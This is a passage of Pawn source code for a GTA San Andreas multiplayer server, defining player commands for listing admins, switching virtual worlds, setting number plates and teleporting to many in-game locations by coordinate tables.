				format(string, sizeof(string), "%s", playername);
			}
        }
	}
	if (strlen(string) <= 105)
	SendClientMessage(playerid, COLOR_FLBLUE, string);
	return 1;
}

dcmd_admins(playerid,params[])
{
	#pragma unused params

	new string[128],
		Players = 0;

	if (IsPlayerAdminLevel(playerid, 4))
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		if (IsPlayerConnected(i) && IsAdmin(i)) Players++;

		if (!Players)
		return SendClientMessage(playerid, COLOR_FLBLUE, "Admins [0]: None");

		format(string, sizeof(string), "Admins [%d]:", Players);
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i) && IsAdmin(i))
			{
			    GetPlayerName(i, playername, sizeof(playername));
				if (strlen(string) <= 100)
				{
					format(string, sizeof(string), "%s %s (%d[%d])", string, playername, player[i][ADMIN], player[i][hideadmin]);
				} else {
					SendClientMessage(playerid, COLOR_FLBLUE, string);
					format(string, sizeof(string), "%s", playername);
				}
	        }
		}
		if (strlen(string) <= 100)
		SendClientMessage(playerid, COLOR_FLBLUE, string);
	} else {
		for (new i = 0; i < MAX_PLAYERS; i++)
		if (IsPlayerConnected(i) && IsAdmin(i) && player[i][hideadmin] == 0) Players++;

		if (!Players)
		return SendClientMessage(playerid, COLOR_FLBLUE, "Admins [0]: None");

		format(string, sizeof(string), "Admins [%d]:", Players);
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i) && IsAdmin(i) && player[i][hideadmin] == 0)
			{
			    GetPlayerName(i, playername, sizeof(playername));
				if (strlen(string) <= 105)
				{
					format(string, sizeof(string), "%s %s (%d)", string, playername, player[i][ADMIN]);
				} else {
					SendClientMessage(playerid, COLOR_FLBLUE, string);
					format(string, sizeof(string), "%s", playername);
				}
	        }
		}
		if (strlen(string) <= 105)
		SendClientMessage(playerid, COLOR_FLBLUE, string);
	}
	return 1;
}

dcmd_world(playerid,params[])
{
	new idx,
		vworld;

	strings = strtok(params,idx);
	if (!strlen(strings))
 	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /world <0-500/myworld> [Premium users: 1,000.000.000 worlds available]");

	if (!strcmp(strings, "myworld", true))
	{
		format(strings, sizeof(strings), "[INFO]: Your world: %d", GetPlayerVirtualWorld(playerid));
		SendClientMessage(playerid,COLOR_GREEN,strings);
		return 1;
	}

 	vworld = strval(strings);
	if (IsVIP(playerid))
	{
	 	if (vworld < 0 || vworld > VIP_MAX_WORLDS)
	 	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /world <0-500/myworld> [Premium users: 1,000.000.000 worlds available]");
 	} else {
	 	if (vworld < 0 || vworld > DEFAULT_MAX_WORLDS)
	 	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /world <0-500/myworld> [Premium users: 1,000.000.000 worlds available]");
 	}

  	if (GetPlayerVirtualWorld(playerid) == vworld)
	return SendErrorMessage(playerid, EMBED_WHITE, "You're already in this world.");

    if (!IsPlayerAdminLevel(playerid, 3))
    {
		if (!AntiSpam(playerid, 2)) return 1;
	}

	new vID = GetPlayerVehicleID(playerid);
	if (vID && IsPlayerDriver(playerid))
	{
		if (GetVehicleModel(vID) == 537 || GetVehicleModel(vID) == 538)
		return SendErrorMessage(playerid, EMBED_WHITE, "Cannot change world when in a train.");

		else SetVehicleVirtualWorld(vID, vworld);
	}

	SetPlayerVirtualWorld(playerid, vworld);
	player[playerid][virtualworld] = vworld;
	format(strings, sizeof(strings), "[SUCCESS]: You have set your world to %d.",vworld);
	SendClientMessage(playerid,COLOR_GREEN,strings);

	if (vworld == 0)
	{
		new Float:X,
	       	Float:Y,
	       	Float:Z;

	 	GetPlayerPos(playerid, X, Y, Z);
	 	if (X <= -845.1447 && X >= -1319.4437 && Y <= -823.1377 && Y >= -1133.5485 || X <= -1337.3257 && X >= -1484.2833 && Y <= -1420.2683 && Y >= -1610.2789)
		//if (IsPlayerInArea(playerid, -1319.4437, -1133.5485, -845.1447, -823.1377) || IsPlayerInArea(playerid, -1484.2833, -1610.2789, -1337.3257, -1420.2683))
		//if (IsPlayerInDynamicArea(playerid, spawnareaid) || IsPlayerInDynamicArea(playerid, spawnareaid2))
		{
			ResetPlayerWeapons(playerid);

			new VehicleID = GetPlayerVehicleID(playerid);
			if (VehicleID)
			{
			    if (ForbiddenSpawnVehicles( GetVehicleModel(VehicleID) ))
				{
				    DestroyVehicle(VehicleID);
					SendClientMessage(playerid, COLOR_RED, "[INFO]: We do not allow any weapons and armed vehicles inside spawn areas (in world 0)!");
				}
			}
		}
	}
	return 1;
}

dcmd_numberplate(playerid,params[])
{
	if (sscanf(params, "s[32]", strings))
 	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /numberplate [max 32 characters] - Works only on vehicles with numberplates, colour tags allowed, for example: -RED.");

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle with numberplate");

	if (!AntiSpam(playerid, 2)) return 1;

	new vID = GetPlayerVehicleID(playerid);
	SetVehicleNumberPlate(vID, ColouredText(strings));
	GetVehiclePos(vID, playerxyza[0], playerxyza[1], playerxyza[2]);
 	GetVehicleZAngle(vID, playerxyza[3]);
	SetVehicleToRespawn(vID);

	if (GetPlayerInterior(playerid) > 0)
	LinkVehicleToInterior(vID, GetPlayerInterior(playerid));

	if (GetPlayerVirtualWorld(playerid) > 0)
	SetVehicleVirtualWorld(vID, GetPlayerVirtualWorld(playerid));

	PutPlayerInVehicle(playerid, vID, 0);
	SetPlayerPosEx(playerid, playerxyza[0], playerxyza[1], playerxyza[2], playerxyza[3], 0);
	return 1;
}

dcmd_teleports(playerid,params[])
{
	#pragma unused params

	SendClientMessage(playerid, COLOR_YELLOW, "* /ls, /sf(/mc), /lv for major city teleports *");
	SendClientMessage(playerid, COLOR_YELLOW, "* /citylist for a list of small city teleports *");
	SendClientMessage(playerid, COLOR_YELLOW, "* /parklot to get a list of parkinglots *");
	SendClientMessage(playerid, COLOR_YELLOW, "* /ship to get a list of ships *");
	SendClientMessage(playerid, COLOR_YELLOW, "* /airport to get a list of airports *");
	SendClientMessage(playerid, COLOR_YELLOW, "* /bridge to get a list of bridges *");
	SendClientMessage(playerid, COLOR_YELLOW, "* /sta to get a list of stadiums *");
	SendClientMessage(playerid, COLOR_YELLOW, "* /train to get a list of trainstations *");
	SendClientMessage(playerid, COLOR_YELLOW, "* /sea to get a list of sea-teleports *");
	SendClientMessage(playerid, COLOR_YELLOW, "* /iteleports for a list of interior teleports *");
	return 1;
}

dcmd_iteleports(playerid,params[])
{
	new idx;

 	strings = strtok(params, idx);
  	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 3)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /iteleports <1-3>");

	switch(strval(strings)) {
	case 1: {
			SendClientMessage(playerid, COLOR_YELLOW, "* /247 for a list of 24/7 teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /air for a list of airport related teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /ammu for a list of ammunation teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /burg for a list of burglary houses teleports");
			SendClientMessage(playerid, COLOR_YELLOW, "* /per for a list of personal care related teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /bus for a list of business teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /casino for a list of casino teleports *");
			return 1;
	       	}
   	case 2: {
			SendClientMessage(playerid, COLOR_YELLOW, "* /cloth for a list of clothing store teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /club for a list of club teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /eat for a list of diner teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /fast for a list of fast food teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /girl for a list of girlfriend related teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /gov for a list of government teleports");
			SendClientMessage(playerid, COLOR_YELLOW, "* /homie for a list of homie related teleports *");
			return 1;
	       	}
   	case 3: {
			SendClientMessage(playerid, COLOR_YELLOW, "* /gym for a list of gym teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /strip for a list of strip club teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /msc for a list of miscellaneous teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /lib for a list of liberty city teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /pol for a list of police station teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /sch for a list of school teleports *");
			SendClientMessage(playerid, COLOR_YELLOW, "* /sta for a list of stadium teleports *");
			return 1;
    		}
    	}
	return 1;
}

dcmd_telelist(playerid,params[])
{
	new idx;

	strings = strtok(params,idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 3)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /telelist <1-3>");

	switch(strval(strings)) {
 	case 1: {
  			SendClientMessage(playerid, COLOR_WHITE, "/TELE 1 - San Fierro Naval Base");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 2 - San Fierro Docks");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 3 - San Fierro Driving School");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 4 - Mount Chiliad");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 5 - Grove Street");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 6 - Ocean Docks, Los Santos");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 7 - Hunter Quarry");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 8 - Los Santos Storm Canal");
			return 1;
	        }
    case 2: {
    		SendClientMessage(playerid, COLOR_WHITE, "/TELE 9 - Glen Park");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 10 - Los Santos Shopping Center");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 11 - The Sherman Dam");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 12 - Las Venturas PD");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 13 - Los Santos Pier");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 14 - Camping Park");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 15 - Los Santos Studio");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 16 - Area 51");
			return 1;
	        }
    case 3: {
         	SendClientMessage(playerid, COLOR_WHITE, "/TELE 17 - Four Dragons Casino");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 18 - Caligula's Casino");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 19 - The Pointy Building");
			SendClientMessage(playerid, COLOR_WHITE, "/TELE 20 - Star Building");
			return 1;
    		}
    	}
	return 1;
}

dcmd_tele(playerid,params[])
{
	new idx;

 	if (IsPlayerInAnyVehicle(playerid) && !IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /tele <1-20> (for a list of teleports /telelist <1-3>)");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 20)
	return SendErrorMessage(playerid, EMBED_WHITE, "/tele <1-20> (for a list of teleports /telelist <1-3>)");

	new Float:TeleTeleports[20][4] = {
		{-1540.9540,463.9418,7.1875},
		{-1984.9027,264.8299,35.1794},
		{-2043.4966,-132.4037,35.2779},
		{-2327.7019,-1631.3575,483.7007},
		{2491.8354,-1668.1565,13.3438},
		{2763.6157,-2447.9072,13.5153},
		{614.4579,849.3126,-43.0445},
		{1892.7506,-1827.4911,3.9844},
		{1970.0704,-1200.2939,25.6321},
		{1129.3180,-1442.0913,15.7969},
		{-716.0689,2061.3584,60.3828},
		{2287.3149,2413.2195,10.8810},
		{369.8532,-2032.2129,7.6719},
		{-60.5679,-1595.1840,2.6430},
		{910.7578,-1221.4493,16.9766},
		{188.6851,1910.3362,17.6443},
		{2041.5160,1007.4940,10.6719},
		{2176.6470,1676.7559,10.8203},
		{-1753.5652,885.9987,295.8750},
		{1544.8800,-1353.4958,329.4740}
	};

	SetPlayerPosEx(playerid, TeleTeleports[teleid-1][0], TeleTeleports[teleid-1][1], TeleTeleports[teleid-1][2], TeleTeleports[teleid-1][3], 0);
	format(strings, sizeof(strings), "You have teleported to Teleport %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_citylist(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 2)
 	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /citylist <1-2>");

  	switch(strval(strings)) {
   	case 1: {
	        SendClientMessage(playerid, COLOR_WHITE, "/CITY 1 - Red County");
			SendClientMessage(playerid, COLOR_WHITE, "/CITY 2 - Angel Pine");
			SendClientMessage(playerid, COLOR_WHITE, "/CITY 3 - Bayside Marina");
			SendClientMessage(playerid, COLOR_WHITE, "/CITY 4 - El Quebrados");
			SendClientMessage(playerid, COLOR_WHITE, "/CITY 5 - Las Barrancas");
			SendClientMessage(playerid, COLOR_WHITE, "/CITY 6 - Fort Carson");
			SendClientMessage(playerid, COLOR_WHITE, "/CITY 7 - Las Payasdas");
			SendClientMessage(playerid, COLOR_WHITE, "/CITY 8 - Blueberry");
			return 1;
	       }
   case 2: {
   			SendClientMessage(playerid, COLOR_WHITE, "/CITY 9 - Montgomery");
			SendClientMessage(playerid, COLOR_WHITE, "/CITY 10 - Palomino Creek");
			return 1;
			}
   		}
	return 1;
}

dcmd_city(playerid,params[])
{
	new idx;

 	if (IsPlayerInAnyVehicle(playerid) && !IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /city <1-10> (for a list of teleports /citylist <1-2>)");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 10)
	return SendErrorMessage(playerid, EMBED_WHITE, "/city <1-10> (for a list of teleports /telelist <1-2>)");

	new Float:CityTeleports[10][3] = {
		{716.5837,-534.2272,16.1815},
		{-2146.8655,-2410.1284,30.4688},
		{-2260.9924,2307.6384,4.8202},
		{-1498.3317,2601.1155,55.6911},
		{-800.0779,1577.5492,26.9609},
		{-104.5705,1097.9807,19.5938},
		{-256.3529,2700.9072,62.5391},
		{233.7724,-137.2319,1.4297},
		{2318.2649,1899.3151,10.6719},
		{2294.2275,41.8093,26.3359}
	};

	SetPlayerPosEx(playerid, CityTeleports[teleid-1][0], CityTeleports[teleid-1][1], CityTeleports[teleid-1][2], 0, 0);
	format(strings, sizeof(strings), "You have teleported to City %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_parklot(playerid,params[])
{
	new idx;

 	if (IsPlayerInAnyVehicle(playerid) && !IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /parklot <1-4 (LS parking lots) 5 (SF parking lot)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 5)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /parklot <1-4 (LS parking lots) 5 (SF parking lot)>");

	new Float:PLotTeleports[5][3] = {
		{2060.5173,2458.3171,10.6818},
		{1927.2258,2215.5293,10.6719},
		{2305.4292,1375.1725,10.8448},
		{1318.8854,315.2429,19.4127},
		{-1811.1765,1271.3563,14.8379}
	};

	SetPlayerPosEx(playerid, PLotTeleports[teleid-1][0], PLotTeleports[teleid-1][1], PLotTeleports[teleid-1][2], 0, 0);
	format(strings, sizeof(strings), "You have teleported to Parklot %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_ship(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ship <1 (SF military) 2 (LS Container) 3 (SF large) 4 (SF small)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 4)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ship <1 (SF military) 2 (LS Container) 3 (SF large) 4 (SF small)>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:ShipTeleports[4][3] = {
		{-1341.2367,507.3179,18.2344},
		{2824.8413,-2431.3943,12.0878},
		{-2466.1431,1546.6107,23.6641},
		{-1470.8608,1489.0396,8.2501}
	};

	SetPlayerPosEx(playerid, ShipTeleports[teleid-1][0], ShipTeleports[teleid-1][1], ShipTeleports[teleid-1][2], 0, 0);
	format(strings, sizeof(strings), "You have teleported to Ship %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_airport(playerid,params[])
{
	new idx;

 	if (IsPlayerInAnyVehicle(playerid) && !IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /airport <1 (LS) 2 (EasterBay) 3 (LV) 4 (Verdant Meadows)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 4)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /airport <1 (LS) 2 (EasterBay) 3 (LV) 4 (Verdant Meadows)>");

	new Float:AirportTeleports[4][3] = {
		{1505.0350,-2616.3782,13.5469},
		{-1358.3328,-235.8711,14.1440},
		{1691.6326,1611.9042,10.8203},
		{417.0450,2501.3586,16.4844}
	};

	SetPlayerPosEx(playerid, AirportTeleports[teleid-1][0],AirportTeleports[teleid-1][1],AirportTeleports[teleid-1][2], 0, 0);
	format(strings, sizeof(strings), "You have teleported to Airport %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_bridge(playerid,params[])
{
	new idx;

 	if (IsPlayerInAnyVehicle(playerid) && !IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bridge <1 (SF Gant Bridge) 2 (SF Garver Bridge) 3 (SF Kincaid Bridge)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 3)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bridge <1 (SF Gant Bridge) 2 (SF Garver Bridge) 3 (SF Kincaid Bridge)>");

	new Float:BridgeTeleports[3][3] = {
		{-2681.9409,1305.8148,55.4297},
		{-1647.1440,565.1022,39.6656},
		{-1573.5327,534.7707,32.8446}
	};

	SetPlayerPosEx(playerid, BridgeTeleports[teleid-1][0], BridgeTeleports[teleid-1][1], BridgeTeleports[teleid-1][2], 0, 0);
	format(strings, sizeof(strings), "You have teleported to Bridge %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_train(playerid,params[])
{
	new idx;

 	if (IsPlayerInAnyVehicle(playerid) && !IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /train <1-2 (LS-Market) 3 (SF) 4-5 (LV Yellowbell-Linden)");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 5)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /train <1-2 (LS-Market) 3 (SF) 4-5 (LV Yellowbell-Linden)");

	new Float:TrainTeleports[5][4] = {
		{816.9129,-1347.2032,13.5278,0.0},
		{1719.7159,-1943.7450,13.5698,178.86},
		{-1989.3280,133.2599,27.5391,0.0},
		{1433.3827,2670.6501,10.6719,271.54},
		{2829.3794,1288.3630,10.7714,359.75}
	};

	SetPlayerPosEx(playerid, TrainTeleports[teleid-1][0], TrainTeleports[teleid-1][1], TrainTeleports[teleid-1][2], TrainTeleports[teleid-1][3], 0);
	format(strings, sizeof(strings), "You have teleported to Train Station %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_sea(playerid,params[])
{
	new idx;

 	if (IsPlayerInAnyVehicle(playerid) && !IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sea <1-2 (LS) 3-5 (SF) 6-8 (LV)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 8)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sea <1-2 (LS) 3-5 (SF) 6-8 (LV)>");

	new Float:SeaTeleports[8][3] = {
		{688.8911,-1964.2723,3.6027},
		{2421.9736,-2318.2021,2.0936},
		{2168.6367,478.8972,2.3758},
		{261.5638,2955.2473,2.9122},
		{-938.7398,2254.4944,50.0793},
		{-1890.7693,1534.7864,3.7009},
		{-2971.0669,-1026.1926,3.6790},
		{-1047.4282,-304.7124,2.5207}
	};

	SetPlayerPosEx(playerid, SeaTeleports[teleid-1][0], SeaTeleports[teleid-1][1], SeaTeleports[teleid-1][2], 0, 0);
	format(strings, sizeof(strings), "You have teleported to Sea %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_247(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /247 <1 (L-shaped(no exit)) 2 (Oblong(no exit)) 3-4 (Square)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /247 <5 (Small, Long) 6 (Small, Square)>");
		return 1;
	}
	teleid = strval(strings);

	if (teleid < 1 || teleid > 6)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /247 <1 (L-shaped(no exit)) 2 (Oblong(no exit)) 3-4 (Square)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /247 <5 (Small, Long) 6 (Small, Square)>");
		return 1;
	}

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:TFSTeleports[6][4] = {
		{-25.884499,-185.868988,1003.549988,17.0},
		{6.091180,-29.271898,1003.549988,10.0},
		{-30.946699,-89.609596,1003.549988,18.0},
		{-25.132599,-139.066986,1003.549988,16.0},
		{-27.312300,-29.277599,1003.549988,4.0},
		{-26.691599,-55.714897,1003.549988,6.0}
	};

	SetPlayerPosEx(playerid, TFSTeleports[teleid-1][0], TFSTeleports[teleid-1][1], TFSTeleports[teleid-1][2], 0.0, floatround(TFSTeleports[teleid-1][3],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to 24/7 %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_air(playerid,params[])
{
	new idx;

 	if (IsPlayerInAnyVehicle(playerid) && !IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /air <1-2 (Francis International) 3 (Shamal Cabin) 4 (Andromenada Cargo)>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 4)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /air <1-2 (Francis International) 3 (Shamal Cabin) 4 (Andromenada Cargo)>");

	new Float:AirTeleports[4][5] = {
		{-1827.147338,7.207418,1061.143554,0.0,14.0},
		{-1855.568725,41.263156,1061.143554,0.0,14.0},
		{2.384830,33.103397,1199.849976,0.0,1.0},
		{315.856170,1024.496459,1949.797363,0.0,9.0}
	};

	SetPlayerPosEx(playerid, AirTeleports[teleid-1][0], AirTeleports[teleid-1][1], AirTeleports[teleid-1][2], AirTeleports[teleid-1][3], floatround(AirTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Air %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_ammu(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ammu <1 (Ocean Flat) 2 (Palomino Creek) 3 (Angle Pine) 4 (Two-Story)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ammu <5 (El Quebrados) 6 (Booth Area) 7 (Range Area)>");
		return 1;
	}
	teleid = strval(strings);

	if (teleid < 1 || teleid > 7)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ammu <1 (Ocean Flat) 2 (Palomino Creek) 3 (Angle Pine) 4 (Two-Story)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ammu <5 (El Quebrados) 6 (Booth Area) 7 (Range Area)>");
		return 1;
	}

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:AmmuTeleports[7][5] = {
		{286.148987,-40.644398,1001.569946,315.0,1.0},
		{286.800995,-82.547600,1001.539978,315.0,4.0},
		{296.919983,-108.071999,1001.569946,90.0,6.0},
		{314.820984,-141.431992,999.661987,45.0,7.0},
		{316.524994,-167.706985,999.661987,45.0,6.0},
		{302.292877,-143.139099,1004.062500,0.0,7.0},
		{280.795104,-135.203353,1004.062500,270.0,7.0}
	};

	SetPlayerPosEx(playerid, AmmuTeleports[teleid-1][0], AmmuTeleports[teleid-1][1], AmmuTeleports[teleid-1][2], AmmuTeleports[teleid-1][3], floatround(AmmuTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Ammunation %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_burg(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /burg <1-23>");
	teleid = strval(strings);

	if (teleid < 1 || teleid > 23)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /burg <1-23>");

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:BurglaryTeleports[23][5] = {
 		{235.508994,1189.169897,1080.339966,0.0,3.0},
   		{225.756989,1240.0,1082.149902,90.0,2.0},
     	{223.043991,1289.259888,1082.199951,0.0,1.0},
      	{225.630997,1022.47998,1084.069946,0.0,7.0},
       	{295.138977,1474.469971,1080.519897,0.0,15.0},
      	{328.493988,1480.589966,1084.449951,0.0,15.0},
	    {385.803986,1471.769897,1080.209961,90.0,15.0},
	    {375.971985,1417.269897,1081.409912,90.0,15.0},
	    {490.810974,1401.48999,1080.339966,0.0,2.0},
	    {447.734985,1400.439941,1084.339966,0.0,2.0},
	    {227.722992,1114.389893,1081.189941,270.0,5.0},
	    {260.983978,1286.549927,1080.299927,0.0,4.0},
	    {221.666992,1143.389893,1082.679932,0.0,4.0},
	    {27.1327,1341.149902,1084.449951,0.0,10.0},
	    {-262.60199,1456.619995,1084.449951,90.0,4.0},
	    {22.778299,1404.959961,1084.449951,0.0,5.0},
	    {140.278,1368.97998,1083.969971,0.0,5.0},
	    {234.04599,1064.879883,1084.309937,0.0,6.0},
	    {-68.294098,1353.469971,1080.279907,0.0,6.0},
	    {-285.548981,1470.97998,1084.449951,0.0,15.0},
	    {-42.581997,1408.109985,1084.449951,0.0,8.0},
	    {83.345093,1324.439941,1083.889893,0.0,9.0},
     	{260.941986,1238.509888,1084.259888,0.0,9.0}
   	};

	SetPlayerPosEx(playerid, BurglaryTeleports[teleid-1][0], BurglaryTeleports[teleid-1][1], BurglaryTeleports[teleid-1][2], BurglaryTeleports[teleid-1][3], floatround(BurglaryTeleports[teleid-1][4],floatround_floor));
	format(strings, sizeof(strings), "You have teleported to Burglary House %d.",teleid);
	SendClientMessage(playerid, COLOR_YELLOW,strings);
	return 1;
}

dcmd_per(playerid,params[])
{
	new idx;

	strings = strtok(params, idx);
 	if (!strlen(strings))
 	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /per <1 (Reece's Hair Studio) 2 (Gay Gordo's Hair Salon) 3 (Macisla's Hair salon)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /per <4 (LS Tattoo Parlor) 5 (Hemlock Tattoo Parlor) 6 (LV Tattoo Parlor)>");
		return 1;
	}
	teleid = strval(strings);

	if (teleid < 1 || teleid > 6)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /per <1 (Reece's Hair Studio) 2 (Gay Gordo's Hair Salon) 3 (Macisla's Hair salon)>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /per <4 (LS Tattoo Parlor) 5 (Hemlock Tattoo Parlor) 6 (LV Tattoo Parlor)>");
		return 1;
	}

 	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	new Float:PersonalTeleports[6][5] = {
 		{411.625977,-21.433298,1001.799988,315.0,2.0},
   		{418.652985,-82.639793,1001.959961,0.0,3.0},
     	{412.021973,-52.649899,1001.959961,270.0,12.0},
      	{-204.439987,-26.453999,1002.299988,315.0,16.0},
      	{-204.439987,-8.4696,1002.299988,315.0,17.0},
      	{-204.439987,-43.652496,1002.299988,315.0,3.0}
   	};

	SetPlayerPosEx(playerid, PersonalTeleports[teleid-1][0], PersonalTeleports[teleid-1][1], PersonalTeleports[teleid-1][2], PersonalTeleports[teleid-1][3], floatround(PersonalTeleports[teleid-1][4],floatround_floor));
